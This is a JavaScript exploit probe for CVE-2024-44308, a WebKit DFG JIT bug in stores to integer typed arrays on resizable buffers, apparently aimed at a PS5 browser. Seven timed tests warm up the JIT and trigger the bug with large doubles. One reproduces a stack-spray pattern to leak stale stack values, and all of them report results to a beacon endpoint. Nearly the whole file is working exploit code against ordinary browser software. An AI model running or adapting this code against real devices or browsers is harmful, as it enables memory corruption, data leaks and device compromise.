/* p100-44308 — CVE-2024-44308 correct DFG trigger
 *
 * BUG: DFGSpeculativeJIT::compilePutByValForIntTypedArray
 * scratch2GPR allocated AFTER slow-path jump for resizable typed arrays.
 * Trigger: large finite double that can't truncate to int32 via vcvttsd2si.
 * NOT NaN/Infinity — those are caught by branchIfNotNaN and bypass the bug.
 *
 * Fixed Safari 18.1.1 (Nov 2024). PS5 = 17.2.x = pre-fix.
 * Exodus Intelligence published full exploit chain.
 *
 * Beacon prefix: V100D-
 */
(function(){
"use strict";
var RUN_ID = "v100d" + Math.random().toString(36).slice(2,12);
var PREFIX = "V100D-";

function B(tag, body) {
  try {
    var d = typeof body === "object" ? JSON.stringify(body) : String(body);
    fetch("/beacon/" + PREFIX + tag, {
      method: "POST", body: JSON.stringify({r: RUN_ID, b: d.slice(0,1800)}),
      headers: {"Content-Type":"application/json"}
    }).catch(function(){});
  } catch(e){}
}
B("L", "press100-44308");

/* ====== D1: Correct trigger — Int32Array on resizable AB ====== */
function test_D1() {
  var r = {};
  try {
    var rab = new ArrayBuffer(16, {maxByteLength: 64});
    var intArray = new Int32Array(rab);

    // The store function — must be its own function for DFG to compile it
    function opt(thing) {
      intArray[0] = thing;
    }

    // Warm up with FLOAT values to ensure DFG compiles with DoubleRepUse
    for (var i = 0; i < 100000; i++) {
      opt(i + 1337.1337);
    }
    r.warmupDone = true;
    r.afterWarmup = intArray[0];

    // TRIGGER: large finite double that can't truncate to int32
    // vcvttsd2si will fail → slow path → stale scratch2GPR
    opt(13371337133713371337.1337);
    r.afterTrigger = intArray[0];

    // Also try other large values
    opt(0xFFFFFFFF + 0.1);
    r.afterFFFF = intArray[0];

    opt(2147483648.5); // INT32_MAX + 1.5
    r.afterMax = intArray[0];

    opt(-2147483649.5); // INT32_MIN - 1.5
    r.afterMin = intArray[0];

    // Check for anomaly — correct behavior is 0 for all out-of-range
    r.ANOMALY = (r.afterTrigger !== 0 || r.afterFFFF !== 0 || r.afterMax !== 0 || r.afterMin !== 0);
    r.SURVIVED = true;

    B("D1-INT32-RAB", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,60); B("D1-ERR", r); }
}

/* ====== D2: Uint32Array variant ====== */
function test_D2() {
  var r = {};
  try {
    var rab = new ArrayBuffer(16, {maxByteLength: 64});
    var uintArray = new Uint32Array(rab);

    function opt2(thing) {
      uintArray[0] = thing;
    }

    for (var i = 0; i < 100000; i++) {
      opt2(i + 1337.1337);
    }
    r.warmupDone = true;

    opt2(13371337133713371337.1337);
    r.afterTrigger = uintArray[0];

    opt2(0xFFFFFFFF + 0.1);
    r.afterFFFF = uintArray[0];

    r.ANOMALY = (r.afterTrigger !== 0 || r.afterFFFF !== 0);
    r.SURVIVED = true;

    B("D2-UINT32-RAB", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,60); B("D2-ERR", r); }
}

/* ====== D3: Int8Array variant (also integer typed array) ====== */
function test_D3() {
  var r = {};
  try {
    var rab = new ArrayBuffer(16, {maxByteLength: 64});
    var i8 = new Int8Array(rab);

    function opt3(thing) {
      i8[0] = thing;
    }

    for (var i = 0; i < 100000; i++) {
      opt3(i + 1337.1337);
    }

    opt3(13371337133713371337.1337);
    r.afterTrigger = i8[0];

    r.ANOMALY = (r.afterTrigger !== 0);
    r.SURVIVED = true;

    B("D3-INT8-RAB", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,60); B("D3-ERR", r); }
}

/* ====== D4: SharedArrayBuffer test (may be blocked on PS5) ====== */
function test_D4() {
  var r = {};
  try {
    r.SAB_EXISTS = typeof SharedArrayBuffer !== 'undefined';
    if (!r.SAB_EXISTS) {
      B("D4-SAB", r);
      return;
    }

    try {
      var sab = new SharedArrayBuffer(16, {maxByteLength: 64});
      r.SAB_CTOR = true;
      r.sabByteLength = sab.byteLength;
      r.sabMaxByteLength = sab.maxByteLength;

      var intArray = new Int32Array(sab);
      r.i32OnSAB = true;

      function optSAB(thing) {
        intArray[0] = thing;
      }

      for (var i = 0; i < 100000; i++) {
        optSAB(i + 1337.1337);
      }

      optSAB(13371337133713371337.1337);
      r.afterTrigger = intArray[0];
      r.ANOMALY = (r.afterTrigger !== 0);
      r.SURVIVED = true;
    } catch(e) {
      r.SAB_CTOR = false;
      r.sabErr = e.name + ':' + e.message.slice(0,50);
    }

    B("D4-SAB", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,60); B("D4-SAB", r); }
}

/* ====== D5: Stack spray + trigger (Exodus pattern) ====== */
function test_D5() {
  B("D5-START", "exodus-pattern");
  var r = {};
  try {
    var rab = new ArrayBuffer(16, {maxByteLength: 64});
    var intArray = new Int32Array(rab);

    // Stack spray function — fills spill slots with controlled values
    // Must have same signature and similar structure to trigger function
    // Padding with local variable accesses creates register pressure
    function opt1(ary, ary1) {
      var l = [ary, ary1, ary, ary1, ary, ary1, ary, ary1];
      l[0]; l[1]; l[2]; l[3]; l[4]; l[5]; l[6]; l[7];
      intArray[0] = ary;
      return ary1;
    }

    // Trigger function — reads stale stack value left by opt1
    function opt(ary, ary1) {
      var l = [ary, ary1, ary, ary1, ary, ary1, ary, ary1];
      l[0]; l[1]; l[2]; l[3]; l[4]; l[5]; l[6]; l[7];
      intArray[0] = ary;
      return ary1;
    }

    // Objects with specific property layouts
    var oj = {_a: 0, b: 0, c: 0, d: 0, a: 378 * Number.MIN_VALUE};
    var oj1 = {a: 0, b: 0, c: 0, d: 0};
    var victim = {a: 1, b: 0, c: 0, d: 0};

    // Warm both functions
    for (var i = 0; i < 10000; i++) opt1(i + 1337.1337, oj1);
    for (var i = 0; i < 10000; i++) opt(i + 1337.1337, oj);
    r.warmupDone = true;

    // Stack set and trigger
    function stack_set_and_call(val, val1) {
      var a = opt1(1337.1337, val);
      var b = opt(13371337133713371337.1337, val1);
      return b;
    }

    // Train stack_set_and_call
    for (var i = 0; i < 5000; i++) {
      stack_set_and_call(oj1, oj);
    }
    r.trainDone = true;

    // Now trigger with victim
    victim.a = oj1;
    var leaked = stack_set_and_call(oj1, oj);
    r.leakedType = typeof leaked;
    if (typeof leaked === 'number') {
      r.leakedVal = leaked;
      r.leakedHex = leaked.toString(16);
      r.LEAK = true;
    } else if (typeof leaked === 'object') {
      r.leakedIsNull = leaked === null;
      r.leakedIsOj = leaked === oj;
      r.leakedIsOj1 = leaked === oj1;
    }
    r.SURVIVED = true;

    B("D5-EXODUS", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,60); B("D5-ERR", r); }
}

/* ====== D6: Crash-or-survive with minimal trigger ====== */
function test_D6() {
  B("D6-START", "minimal-crash-test");
  var r = {};
  try {
    // Minimal reproduction from GitHub PoC
    var buf = new ArrayBuffer(4, {maxByteLength: 8});
    var arr = new Int32Array(buf);

    function store(v) { arr[0] = v; }

    // DFG warmup with floats
    for (var i = 0; i < 150000; i++) store(i + 0.5);

    r.preVal = arr[0];

    // Trigger — if this crashes (no D6 beacon), the bug is LIVE
    store(13371337133713371337.1337);

    r.postVal = arr[0];
    r.SURVIVED = true;

    // Try multiple triggers in succession
    for (var j = 0; j < 100; j++) {
      store(13371337133713371337.1337);
    }
    r.multiVal = arr[0];
    r.MULTI_SURVIVED = true;

    B("D6-MINIMAL", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,60); B("D6-ERR", r); }
}

/* ====== D7: Different DFG warmup patterns ====== */
function test_D7() {
  var r = {};
  try {
    // Pattern A: warmup with fractions only
    var rab1 = new ArrayBuffer(8, {maxByteLength: 32});
    var a1 = new Int32Array(rab1);
    function storeA(v) { a1[0] = v; }
    for (var i = 0; i < 100000; i++) storeA(Math.PI * i);
    storeA(13371337133713371337.1337);
    r.patA = a1[0];

    // Pattern B: warmup alternating int/float
    var rab2 = new ArrayBuffer(8, {maxByteLength: 32});
    var a2 = new Int32Array(rab2);
    function storeB(v) { a2[0] = v; }
    for (var i = 0; i < 100000; i++) storeB(i % 2 === 0 ? i : i + 0.1);
    storeB(13371337133713371337.1337);
    r.patB = a2[0];

    // Pattern C: Uint16Array
    var rab3 = new ArrayBuffer(8, {maxByteLength: 32});
    var a3 = new Uint16Array(rab3);
    function storeC(v) { a3[0] = v; }
    for (var i = 0; i < 100000; i++) storeC(i + 0.7);
    storeC(13371337133713371337.1337);
    r.patC = a3[0];

    r.ANY_ANOMALY = (r.patA !== 0 || r.patB !== 0 || r.patC !== 0);
    r.SURVIVED = true;
    B("D7-PATTERNS", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,60); B("D7-ERR", r); }
}

/* ====== Run ====== */
try {
  test_D1();                    // Int32Array on RAB (0ms)
  setTimeout(test_D2, 4000);    // Uint32Array on RAB (4s)
  setTimeout(test_D3, 8000);    // Int8Array on RAB (8s)
  setTimeout(test_D4, 12000);   // SharedArrayBuffer test (12s)
  setTimeout(test_D6, 16000);   // Minimal crash test (16s) — before D5
  setTimeout(test_D7, 22000);   // Different warmup patterns (22s)
  setTimeout(test_D5, 28000);   // Full Exodus pattern (28s) — DANGER LAST
} catch(e) { B("FATAL", String(e).slice(0,200)); }

var hbI = setInterval(function(){ B("HB","hb"); }, 4000);
setTimeout(function(){ clearInterval(hbI); B("Z2","probe100-done"); }, 50000);
})();
